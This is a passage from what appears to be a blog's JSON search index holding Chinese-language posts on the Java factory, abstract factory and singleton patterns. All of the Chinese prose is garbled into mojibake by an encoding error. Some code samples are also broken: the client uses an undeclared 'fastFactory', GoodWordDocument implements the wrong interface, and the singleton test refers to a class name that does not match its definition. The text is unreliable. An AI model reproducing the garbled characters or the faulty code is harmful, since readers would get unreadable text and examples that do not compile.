å®Œæˆbuild","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å·¥å‚è®¾è®¡æ¨¡å¼","slug":"å·¥å‚è®¾è®¡æ¨¡å¼","date":"2020-06-06T04:42:10.000Z","updated":"2021-04-11T17:11:28.855Z","comments":true,"path":"å·¥å‚è®¾è®¡æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E5%B7%A5%E5%8E%82%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"å·¥å‚è®¾è®¡æ¨¡å¼å·¥å‚æ–¹æ³•å·¥å‚æ–¹æ³•å³Factory Methodï¼Œæ˜¯ä¸€ç§å¯¹è±¡åˆ›å»ºå‹æ¨¡å¼ã€‚","text":"å·¥å‚è®¾è®¡æ¨¡å¼å·¥å‚æ–¹æ³•å·¥å‚æ–¹æ³•å³Factory Methodï¼Œæ˜¯ä¸€ç§å¯¹è±¡åˆ›å»ºå‹æ¨¡å¼ã€‚ å·¥å‚æ–¹æ³•çš„ç›®çš„æ˜¯ä½¿å¾—åˆ›å»ºå¯¹è±¡å’Œä½¿ç”¨å¯¹è±¡æ˜¯åˆ†ç¦»çš„ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯æ€»æ˜¯å¼•ç”¨æŠ½è±¡å·¥å‚å’ŒæŠ½è±¡äº§å“ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Product â”‚ â”‚ Factory â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â–² â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ ProductImpl â”‚&lt;â”€ â”€ â”€â”‚ FactoryImpl â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ä¾‹å¦‚å®ç°ä¸€ä¸ªè§£æå­—ç¬¦ä¸²åˆ°Numberçš„Factoryï¼Œå¯ä»¥å®šä¹‰å¦‚ä¸‹ï¼š public class NumberFactoryImpl implements NumberFactory { public Number parse(String s) { return new BigDecimal(s); } } è€Œäº§å“æ¥å£æ˜¯Numberï¼ŒNumberFactoryImplè¿”å›çš„å®é™…äº§å“æ˜¯BigDecimalã€‚ é‚£ä¹ˆå®¢æˆ·ç«¯å¦‚ä½•åˆ›å»ºNumberFactoryImplå‘¢ï¼Ÿé€šå¸¸æˆ‘ä»¬ä¼šåœ¨æ¥å£Factoryä¸­å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³•getFactory()æ¥è¿”å›çœŸæ­£çš„å­ç±»ï¼š public interface NumberFactory { // åˆ›å»ºæ–¹æ³•: Number parse(String s); // è·å–å·¥å‚å®ä¾‹: static NumberFactory getFactory() { return impl; } static NumberFactory impl = new NumberFactoryImpl(); } åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å’Œå·¥å‚æ¥å£NumberFactoryä»¥åŠæŠ½è±¡äº§å“Numberæ‰“äº¤é“ï¼š NumberFactory factory = NumberFactory.getFactory(); Number result = factory.parse(&quot;123.456&quot;); è°ƒç”¨æ–¹å¯ä»¥å®Œå…¨å¿½ç•¥çœŸæ­£çš„å·¥å‚NumberFactoryImplå’Œå®é™…çš„äº§å“BigDecimalï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯å…è®¸åˆ›å»ºäº§å“çš„ä»£ç ç‹¬ç«‹åœ°å˜æ¢ï¼Œè€Œä¸ä¼šå½±å“åˆ°è°ƒç”¨æ–¹ã€‚ å®é™…ä¸Šå¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸éœ€è¦æŠ½è±¡å·¥å‚ï¼Œè€Œæ˜¯é€šè¿‡é™æ€æ–¹æ³•ç›´æ¥è¿”å›äº§å“ï¼Œå³ï¼š public class NumberFactory { public static Number parse(String s) { return new BigDecimal(s); } } è¿™ç§ç®€åŒ–çš„ä½¿ç”¨é™æ€æ–¹æ³•åˆ›å»ºäº§å“çš„æ–¹å¼ç§°ä¸ºé™æ€å·¥å‚æ–¹æ³•ï¼ˆStatic Factory Methodï¼‰ã€‚é™æ€å·¥å‚æ–¹æ³•å¹¿æ³›åœ°åº”ç”¨åœ¨Javaæ ‡å‡†åº“ä¸­ã€‚ä¾‹å¦‚ï¼š Integer n = Integer.valueOf(100); Integeræ—¢æ˜¯äº§å“åˆæ˜¯é™æ€å·¥å‚ã€‚å®ƒæä¾›äº†é™æ€æ–¹æ³•valueOf()æ¥åˆ›å»ºIntegerã€‚é‚£ä¹ˆè¿™ç§æ–¹å¼å’Œç›´æ¥å†™new Integer(100)æœ‰ä½•åŒºåˆ«å‘¢ï¼Ÿæˆ‘ä»¬è§‚å¯ŸvalueOf()æ–¹æ³•ï¼š public final class Integer { public static Integer valueOf(int i) { if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } ... } å®ƒçš„å¥½å¤„åœ¨äºï¼ŒvalueOf()å†…éƒ¨å¯èƒ½ä¼šä½¿ç”¨newåˆ›å»ºä¸€ä¸ªæ–°çš„Integerå®ä¾‹ï¼Œä½†ä¹Ÿå¯èƒ½ç›´æ¥è¿”å›ä¸€ä¸ªç¼“å­˜çš„Integerå®ä¾‹ã€‚å¯¹äºè°ƒç”¨æ–¹æ¥è¯´ï¼Œæ²¡å¿…è¦çŸ¥é“Integeråˆ›å»ºçš„ç»†èŠ‚ã€‚ å·¥å‚æ–¹æ³•å¯ä»¥éšè—åˆ›å»ºäº§å“çš„ç»†èŠ‚ï¼Œä¸”ä¸ä¸€å®šæ¯æ¬¡éƒ½ä¼šçœŸæ­£åˆ›å»ºäº§å“ï¼Œå®Œå…¨å¯ä»¥è¿”å›ç¼“å­˜çš„äº§å“ï¼Œä»è€Œæå‡é€Ÿåº¦å¹¶å‡å°‘å†…å­˜æ¶ˆè€—ã€‚ å¦‚æœè°ƒç”¨æ–¹ç›´æ¥ä½¿ç”¨Integer n = new Integer(100)ï¼Œé‚£ä¹ˆå°±å¤±å»äº†ä½¿ç”¨ç¼“å­˜ä¼˜åŒ–çš„å¯èƒ½æ€§ã€‚ æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„å¦ä¸€ä¸ªé™æ€å·¥å‚æ–¹æ³•æ˜¯List.of()ï¼š List&lt;String&gt; list = List.of(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;); è¿™ä¸ªé™æ€å·¥å‚æ–¹æ³•æ¥æ”¶å¯å˜å‚æ•°ï¼Œç„¶åè¿”å›Listæ¥å£ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè°ƒç”¨æ–¹è·å–çš„äº§å“æ€»æ˜¯Listæ¥å£ï¼Œè€Œä¸”å¹¶ä¸å…³å¿ƒå®ƒçš„å®é™…ç±»å‹ã€‚å³ä½¿è°ƒç”¨æ–¹çŸ¥é“Listäº§å“çš„å®é™…ç±»å‹æ˜¯java.util.ImmutableCollections$ListNï¼Œä¹Ÿä¸è¦å»å¼ºåˆ¶è½¬å‹ä¸ºå­ç±»ï¼Œå› ä¸ºé™æ€å·¥å‚æ–¹æ³•List.of()ä¿è¯è¿”å›Listï¼Œä½†ä¹Ÿå®Œå…¨å¯ä»¥ä¿®æ”¹ä¸ºè¿”å›java.util.ArrayListã€‚è¿™å°±æ˜¯é‡Œæ°æ›¿æ¢åŸåˆ™ï¼šè¿”å›å®ç°æ¥å£çš„ä»»æ„å­ç±»éƒ½å¯ä»¥æ»¡è¶³è¯¥æ–¹æ³•çš„è¦æ±‚ï¼Œä¸”ä¸å½±å“è°ƒç”¨æ–¹ã€‚ æ€»æ˜¯å¼•ç”¨æ¥å£è€Œéå®ç°ç±»ï¼Œèƒ½å…è®¸å˜æ¢å­ç±»è€Œä¸å½±å“è°ƒç”¨æ–¹ï¼Œå³å°½å¯èƒ½é¢å‘æŠ½è±¡ç¼–ç¨‹ã€‚ å’ŒList.of()ç±»ä¼¼ï¼Œæˆ‘ä»¬ä½¿ç”¨MessageDigestæ—¶ï¼Œä¸ºäº†åˆ›å»ºæŸä¸ªæ‘˜è¦ç®—æ³•ï¼Œæ€»æ˜¯ä½¿ç”¨é™æ€å·¥å‚æ–¹æ³•getInstance(String)ï¼š MessageDigest md5 = MessageDigest.getInstance(&quot;MD5&quot;); MessageDigest sha1 = MessageDigest.getInstance(&quot;SHA-1&quot;); è°ƒç”¨æ–¹é€šè¿‡äº§å“åç§°è·å¾—äº§å“å®ä¾‹ï¼Œä¸ä½†è°ƒç”¨ç®€å•ï¼Œè€Œä¸”è·å¾—çš„å¼•ç”¨ä»ç„¶æ˜¯MessageDigestè¿™ä¸ªæŠ½è±¡ç±»ã€‚ æŠ½è±¡å·¥å‚ æä¾›ä¸€ä¸ªåˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–å¯¹è±¡çš„æ¥å£ï¼Œè€Œæ— éœ€æŒ‡å®šå®ƒä»¬å…·ä½“çš„ç±»ã€‚ æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract Factoryï¼‰æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„åˆ›å»ºå‹æ¨¡å¼ã€‚ æŠ½è±¡å·¥å‚æ¨¡å¼å’Œå·¥å‚æ–¹æ³•ä¸å¤ªä¸€æ ·ï¼Œå®ƒè¦è§£å†³çš„é—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œä¸ä½†å·¥å‚æ˜¯æŠ½è±¡çš„ï¼Œäº§å“æ˜¯æŠ½è±¡çš„ï¼Œè€Œä¸”æœ‰å¤šä¸ªäº§å“éœ€è¦åˆ›å»ºï¼Œå› æ­¤ï¼Œè¿™ä¸ªæŠ½è±¡å·¥å‚ä¼šå¯¹åº”åˆ°å¤šä¸ªå®é™…å·¥å‚ï¼Œæ¯ä¸ªå®é™…å·¥å‚è´Ÿè´£åˆ›å»ºå¤šä¸ªå®é™…äº§å“ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”€ &gt;â”‚ProductAâ”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ Client â”‚â”€ â”€&gt;â”‚ Factory â”‚â”€ â”€ â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â–² â”€ &gt;â”‚ProductBâ”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚Factory1 â”‚ â”‚Factory2 â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”€ &gt;â”‚ProductA1â”‚ â”€ &gt;â”‚ProductA2â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”” â”€&gt;â”‚ProductB1â”‚ â”” â”€&gt;â”‚ProductB2â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ è¿™ç§æ¨¡å¼æœ‰ç‚¹ç±»ä¼¼äºå¤šä¸ªä¾›åº”å•†è´Ÿè´£æä¾›ä¸€ç³»åˆ—ç±»å‹çš„äº§å“ã€‚æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ï¼š å‡è®¾æˆ‘ä»¬å¸Œæœ›ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªMarkdownæ–‡æœ¬è½¬æ¢ä¸ºHTMLå’ŒWordçš„æœåŠ¡ï¼Œå®ƒçš„æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š public interface AbstractFactory { // åˆ›å»ºHtmlæ–‡æ¡£: HtmlDocument createHtml(String md); // åˆ›å»ºWordæ–‡æ¡£: WordDocument createWord(String md); } æ³¨æ„åˆ°ä¸Šé¢çš„æŠ½è±¡å·¥å‚ä»…ä»…æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ²¡æœ‰ä»»ä½•ä»£ç ã€‚åŒæ ·çš„ï¼Œå› ä¸ºHtmlDocumentå’ŒWordDocumentéƒ½æ¯”è¾ƒå¤æ‚ï¼Œç°åœ¨æˆ‘ä»¬å¹¶ä¸çŸ¥é“å¦‚ä½•å®ç°å®ƒä»¬ï¼Œæ‰€ä»¥åªæœ‰æ¥å£ï¼š // Htmlæ–‡æ¡£æ¥å£: public interface HtmlDocument { String toHtml(); void save(Path path) throws IOException; } // Wordæ–‡æ¡£æ¥å£: public interface WordDocument { void save(Path path) throws IOException; } è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®šä¹‰å¥½äº†æŠ½è±¡å·¥å‚ï¼ˆAbstractFactoryï¼‰ä»¥åŠä¸¤ä¸ªæŠ½è±¡äº§å“ï¼ˆHtmlDocumentå’ŒWordDocumentï¼‰ã€‚å› ä¸ºå®ç°å®ƒä»¬æ¯”è¾ƒå›°éš¾ï¼Œæˆ‘ä»¬å†³å®šè®©ä¾›åº”å•†æ¥å®Œæˆã€‚ ç°åœ¨å¸‚åœºä¸Šæœ‰ä¸¤å®¶ä¾›åº”å•†ï¼šFastDoc Softçš„äº§å“ä¾¿å®œï¼Œå¹¶ä¸”è½¬æ¢é€Ÿåº¦å¿«ï¼Œè€ŒGoodDoc Softçš„äº§å“è´µï¼Œä½†è½¬æ¢æ•ˆæœå¥½ã€‚æˆ‘ä»¬å†³å®šåŒæ—¶ä½¿ç”¨è¿™ä¸¤å®¶ä¾›åº”å•†çš„äº§å“ï¼Œä»¥ä¾¿ç»™å…è´¹ç”¨æˆ·å’Œä»˜è´¹ç”¨æˆ·æä¾›ä¸åŒçš„æœåŠ¡ã€‚ æˆ‘ä»¬å…ˆçœ‹çœ‹FastDoc Softçš„äº§å“æ˜¯å¦‚ä½•å®ç°çš„ã€‚é¦–å…ˆï¼ŒFastDoc Softå¿…é¡»è¦æœ‰å®é™…çš„äº§å“ï¼Œå³FastHtmlDocumentå’ŒFastWordDocumentï¼š public class FastHtmlDocument implements HtmlDocument { public String toHtml() { ... } public void save(Path path) throws IOException { ... } } public class FastWordDocument implements WordDocument { public void save(Path path) throws IOException { ... } } ç„¶åï¼ŒFastDoc Softå¿…é¡»æä¾›ä¸€ä¸ªå®é™…çš„å·¥å‚æ¥ç”Ÿäº§è¿™ä¸¤ç§äº§å“ï¼Œå³FastFactoryï¼š public class FastFactory implements AbstractFactory { public HtmlDocument createHtml(String md) { return new FastHtmlDocument(md); } public WordDocument createWord(String md) { return new FastWordDocument(md); } } è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨FastDoc Softçš„æœåŠ¡äº†ã€‚å®¢æˆ·ç«¯ç¼–å†™ä»£ç å¦‚ä¸‹ï¼š // åˆ›å»ºAbstractFactoryï¼Œå®é™…ç±»å‹æ˜¯FastFactory: AbstractFactory factory = new FastFactory(); // ç”ŸæˆHtmlæ–‡æ¡£: HtmlDocument html = factory.createHtml(&quot;#Hello\\nHello, world!&quot;); html.save(Paths.get(&quot;.&quot;, &quot;fast.html&quot;)); // ç”ŸæˆWordæ–‡æ¡£: WordDocument word = fastFactory.createWord(&quot;#Hello\\nHello, world!&quot;); word.save(Paths.get(&quot;.&quot;, &quot;fast.doc&quot;)); å¦‚æœæˆ‘ä»¬è¦åŒæ—¶ä½¿ç”¨GoodDoc Softçš„æœåŠ¡æ€ä¹ˆåŠï¼Ÿå› ä¸ºç”¨äº†æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ŒGoodDoc Softåªéœ€è¦æ ¹æ®æˆ‘ä»¬å®šä¹‰çš„æŠ½è±¡å·¥å‚å’ŒæŠ½è±¡äº§å“æ¥å£ï¼Œå®ç°è‡ªå·±çš„å®é™…å·¥å‚å’Œå®é™…äº§å“å³å¯ï¼š // å®é™…å·¥å‚: public class GoodFactory implements AbstractFactory { public HtmlDocument createHtml(String md) { return new GoodHtmlDocument(md); } public WordDocument createWord(String md) { return new GoodWordDocument(md); } } // å®é™…äº§å“: public class GoodHtmlDocument implements HtmlDocument { ... } public class GoodWordDocument implements HtmlDocument { ... } å®¢æˆ·ç«¯è¦ä½¿ç”¨GoodDoc Softçš„æœåŠ¡ï¼Œåªéœ€è¦æŠŠåŸæ¥çš„new FastFactory()åˆ‡æ¢ä¸ºnew GoodFactory()å³å¯ã€‚ æ³¨æ„åˆ°å®¢æˆ·ç«¯ä»£ç é™¤äº†é€šè¿‡newåˆ›å»ºäº†FastFactoryæˆ–GoodFactoryå¤–ï¼Œå…¶ä½™ä»£ç åªå¼•ç”¨äº†äº§å“æ¥å£ï¼Œå¹¶æœªå¼•ç”¨ä»»ä½•å®é™…äº§å“ï¼ˆä¾‹å¦‚ï¼ŒFastHtmlDocumentï¼‰ï¼Œå¦‚æœæŠŠåˆ›å»ºå·¥å‚çš„ä»£ç æ”¾åˆ°AbstractFactoryä¸­ï¼Œå°±å¯ä»¥è¿å®é™…å·¥å‚ä¹Ÿå±è”½äº†ï¼š public interface AbstractFactory { public static AbstractFactory createFactory(String name) { if (name.equalsIgnoreCase(&quot;fast&quot;)) { return new FastFactory(); } else if (name.equalsIgnoreCase(&quot;good&quot;)) { return new GoodFactory(); } else { throw new IllegalArgumentException(&quot;Invalid factory name&quot;); } } }","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å•ä¾‹æ¨¡å¼","slug":"å•ä¾‹æ¨¡å¼","date":"2020-06-05T22:05:04.000Z","updated":"2021-04-11T17:11:28.778Z","comments":true,"path":"å•ä¾‹æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","excerpt":"å•ä¾‹è®¾è®¡æ¨¡å¼","text":"å•ä¾‹è®¾è®¡æ¨¡å¼ æ‰€è°“ç±»çš„å•ä¾‹è®¾è®¡æ¨¡å¼ï¼Œå°±æ˜¯é‡‡ç”¨ä¸€å®šçš„æ–¹æ³•ä¿è¯åœ¨æ•´ä¸ªè½¯ä»¶ç³»ç»Ÿä¸­ï¼Œå¯¹æŸä¸ªç±»åªèƒ½å­˜åœ¨ä¸€ä¸ªå¯¹è±¡å®ä¾‹ï¼Œå¹¶ä¸”è¯¥ç±»åªæä¾›ä¸€ä¸ªå–å¾—å¯¹è±¡å®ä¾‹çš„æ–¹æ³•(é™æ€æ–¹æ³•)ã€‚ æ¯”å¦‚Hibernateçš„SessionFactoryï¼Œå®ƒå……å½“æ•°æ®å­˜å‚¨æºçš„ä»£ç†ï¼Œå¹¶è´Ÿè´£åˆ›å»ºSession å¯¹è±¡ã€‚SessionFactoryå¹¶ä¸æ˜¯è½»é‡çº§çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªé¡¹ç›®é€šå¸¸åªéœ€è¦ä¸€ä¸ª SessionFactoryå°±å¤Ÿï¼Œè¿™æ˜¯å°±ä¼šä½¿ç”¨åˆ°å•ä¾‹æ¨¡å¼ã€‚ å•ä¾‹æ¨¡å¼æœ‰å…«ç§æ–¹å¼ï¼š é¥¿æ±‰å¼(é™æ€å¸¸é‡) é¥¿æ±‰å¼ï¼ˆé™æ€ä»£ç å—ï¼‰ æ‡’æ±‰å¼(çº¿ç¨‹ä¸å®‰å…¨) æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥æ–¹æ³•) æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥ä»£ç å—) åŒé‡æ£€æŸ¥ é™æ€å†…éƒ¨ç±» æšä¸¾ é¥¿æ±‰å¼(é™æ€å˜é‡) /** * @Author: Wizard * @Date: 2020/6/6 14:13 */ public class Singleton1 { public static void main(String[] args) { //Test SingleTon instance1 = SingleTon.getInstance(); SingleTon instance2 = SingleTon.getInstance(); System.out.println(instance1==instance2);//true } } //é¥¿æ±‰å¼(é™æ€å˜é‡) class SingleTon1 { //1.æ„é€ å™¨ç§æœ‰åŒ–, å¤–éƒ¨ä¸èƒ½new private SingleTon1() { } //2.åœ¨æœ¬ç±»å†…éƒ¨åˆ›å»ºå¯¹è±¡å®ä¾‹ private final static SingleTon1 instance = new SingleTon1(); //3.æä¾›ä¸€ä¸ªå…¬æœ‰çš„é™æ€æ–¹æ³•ï¼Œè¿”å›å®ä¾‹å¯¹è±¡ public static SingleTon1 getInstance() { return instance; } } ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼šè¿™ç§å†™æ³•æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨ç±»è£…è½½çš„æ—¶å€™å°±å®Œæˆå®ä¾‹åŒ–ã€‚é¿å…äº†çº¿ç¨‹åŒ æ­¥é—®é¢˜ã€‚ ç¼ºç‚¹ï¼šåœ¨ç±»è£…è½½çš„æ—¶å€™å°±å®Œæˆå®ä¾‹åŒ–ï¼Œæ²¡æœ‰è¾¾åˆ°Lazy Loadingçš„æ•ˆæœã€‚å¦‚æœä»å§‹ è‡³ç»ˆä»æœªä½¿ç”¨è¿‡è¿™ä¸ªå®ä¾‹ï¼Œåˆ™ä¼šé€ æˆå†…å­˜çš„æµªè´¹ è¿™ç§æ–¹å¼åŸºäºclassloderæœºåˆ¶é¿å…äº†å¤šçº¿ç¨‹çš„åŒæ­¥é—®é¢˜ï¼Œä¸è¿‡ï¼Œinstanceåœ¨ç±»è£…è½½ æ—¶å°±å®ä¾‹åŒ–ï¼Œåœ¨å•ä¾‹æ¨¡å¼ä¸­å¤§å¤šæ•°éƒ½æ˜¯è°ƒç”¨getInstanceæ–¹æ³•ï¼Œ ä½†æ˜¯å¯¼è‡´ç±»è£…è½½ çš„åŸå› æœ‰å¾ˆå¤šç§ï¼Œå› æ­¤ä¸èƒ½ç¡®å®šæœ‰å…¶ä»–çš„æ–¹å¼ï¼ˆæˆ–è€…å…¶ä»–çš„é™æ€æ–¹æ³•ï¼‰å¯¼è‡´ç±» è£…è½½ï¼Œè¿™æ—¶å€™åˆå§‹åŒ–instanceå°±æ²¡æœ‰è¾¾åˆ° lazy loadingçš„æ•ˆæœ ç»“è®ºï¼šè¿™ç§å•ä¾‹æ¨¡å¼å¯ç”¨ï¼Œå¯èƒ½é€ æˆå†…å­˜æµªè´¹ é¥¿æ±‰å¼(é™æ€ä»£ç å—)img /** * @Author: Wizard * @Date: 2020/6/6 14:13 */ //é¥¿æ±‰å¼(é™æ€ä»£ç å—) class SingleTon2 { //1.æ„é€ å™¨ç§æœ‰åŒ–, å¤–éƒ¨ä¸èƒ½new private SingleTon2() { } //2.åœ¨æœ¬ç±»å†…éƒ¨åˆ›å»ºå¯¹è±¡å®ä¾‹ private static SingleTon2 instance; static { //åœ¨é™æ€ä»£ç å—ä¸­ï¼Œåˆ›å»ºå•ä¾‹å¯¹è±¡,é™æ€ä»£ç å—åªæ‰§è¡Œä¸€æ¬¡ instance = new SingleTon2(); } //3.æä¾›ä¸€ä¸ªå…¬æœ‰çš„é™æ€æ–¹æ³•ï¼Œè¿”å›å®ä¾‹å¯¹è±¡ public static SingleTon2 getInstance() { return instance; } } ä¼˜ç¼ºç‚¹å’Œé™æ€å˜é‡ç›¸åŒ æ‡’æ±‰å¼(çº¿ç¨‹ä¸å®‰å…¨)img //æ‡’æ±‰å¼ class SingleTon3 { private static SingleTon3 instance; private SingleTon3() { } //æä¾›ä¸€ä¸ªé™æ€çš„å…¬æœ‰æ–¹æ³•,å½“ä½¿ç”¨åˆ°è¯¥æ–¹æ³•æ—¶ï¼Œæ‰å»åˆ›å»ºinstance public static SingleTon3 getInstance(){ if (instance==null){ instance = new SingleTon3(); } return instance; } } ä¼˜ç¼ºç‚¹ï¼š èµ·åˆ°äº†Lazy Loadingçš„æ•ˆæœï¼Œä½†æ˜¯åªèƒ½åœ¨å•çº¿ç¨‹ä¸‹ä½¿ç”¨ã€‚ å¦‚æœåœ¨å¤šçº¿ç¨‹ä¸‹ï¼Œä¸€ä¸ªçº¿ç¨‹è¿›å…¥äº†if (singleton == null)åˆ¤æ–­è¯­å¥å—ï¼Œè¿˜æœªæ¥å¾—åŠ å¾€ä¸‹æ‰§è¡Œï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä¹Ÿé€šè¿‡äº†è¿™ä¸ªåˆ¤æ–­è¯­å¥ï¼Œè¿™æ—¶ä¾¿ä¼šäº§ç”Ÿå¤šä¸ªå®ä¾‹ã€‚æ‰€ä»¥ åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¸å¯ä½¿ç”¨è¿™ç§æ–¹å¼ ç»“è®ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œä¸è¦ä½¿ç”¨è¿™ç§æ–¹å¼. æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥æ–¹æ³•)img //æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥æ–¹æ³•) class SingleTon4 { private static SingleTon4 instance; private SingleTon4() { } //æä¾›ä¸€ä¸ªé™æ€çš„å…¬æœ‰æ–¹æ³•,åŠ å…¥åŒæ­¥å¤„ç†çš„ä»£ç ï¼Œè§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ public static synchronized SingleTon4 getInstance(){ if (instance==null){ instance = new SingleTon4(); } return instance; } } ä¼˜ç¼ºç‚¹è¯´æ˜ï¼š è§£å†³äº†çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ æ•ˆç‡å¤ªä½äº†ï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨æƒ³è·å¾—ç±»çš„å®ä¾‹æ—¶å€™ï¼Œæ‰§è¡ŒgetInstance()æ–¹æ³•éƒ½è¦è¿›è¡Œ åŒæ­¥ã€‚è€Œå…¶å®è¿™ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡å®ä¾‹åŒ–ä»£ç å°±å¤Ÿäº†ï¼Œåé¢çš„æƒ³è·å¾—è¯¥ç±»å®ä¾‹ï¼Œ ç›´æ¥returnå°±è¡Œäº†ã€‚æ–¹æ³•è¿›è¡ŒåŒæ­¥æ•ˆç‡å¤ªä½ ç»“è®ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œä¸æ¨èä½¿ç”¨è¿™ç§æ–¹å¼ æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥ä»£ç å—)img //æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨ï¼ŒåŒæ­¥ä»£ç å—) class SingleTon5 { private static SingleTon5 instance; private SingleTon5() { } //æä¾›ä¸€ä¸ªé™æ€çš„å…¬æœ‰æ–¹æ³•,åŠ å…¥åŒæ­¥å¤„ç†çš„ä»£ç ï¼Œè§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ public static SingleTon5 getInstance() { if (instance == null) { synchronized (SingleTon5.class) { instance = new SingleTon5(); } } return instance; } } ä¼˜ç¼ºç‚¹è¯´æ˜ï¼š è¿™ç§æ–¹å¼ï¼Œæœ¬æ„æ˜¯æƒ³å¯¹ç¬¬å››ç§å®ç°æ–¹å¼çš„æ”¹è¿›ï¼Œå› ä¸ºå‰é¢åŒæ­¥æ–¹æ³•æ•ˆç‡å¤ªä½ï¼Œ æ”¹ä¸ºåŒæ­¥äº§ç”Ÿå®ä¾‹åŒ–çš„çš„ä»£ç å— ä½†æ˜¯è¿™ç§åŒæ­¥å¹¶ä¸èƒ½èµ·åˆ°çº¿ç¨‹åŒæ­¥çš„ä½œç”¨ã€‚è·Ÿç¬¬3ç§å®ç°æ–¹å¼é‡åˆ°çš„æƒ…å½¢ä¸€ è‡´ï¼Œå‡å¦‚ä¸€ä¸ªçº¿ç¨‹è¿›å…¥äº†if (singleton == null)åˆ¤æ–­è¯­å¥å—ï¼Œè¿˜æœªæ¥å¾—åŠå¾€ä¸‹æ‰§è¡Œï¼Œ 